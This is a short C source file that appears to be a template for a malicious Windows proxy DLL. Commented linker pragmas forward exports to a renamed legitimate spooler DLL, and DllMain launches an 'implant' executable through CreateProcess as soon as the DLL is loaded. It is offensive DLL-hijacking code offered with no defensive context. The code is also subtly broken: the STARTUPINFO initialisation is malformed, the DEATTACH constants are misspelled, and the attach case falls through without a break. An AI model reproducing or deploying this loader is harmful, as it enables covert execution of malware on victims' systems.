// imports from legit dll
//#pragma comment(linker,"/export:OpenPrinterA=winsplhlp.OpenPrinterA,@143")
//#pragma comment(linker,"/export:NONAME=winsplhlp.#100,@100,NONAME")

#include <Windows.h>

void Go(void) {
	STARTUPINFO info=(sizeof(info));
	PROCESS_INFORMATION processInfo;

		CreateProcess("C:\\path\\to\\implant", "", NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ui_reason_for_call, LPVOID lpReserved) {

	switch (ui_reason_for_call) {
	case DLL_PROCESS_ATTACH:
		Go();
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DEATTACH:
		break;
	case DLL_PROCESS_DEATTACH:
		break;
	}
	return TRUE;
}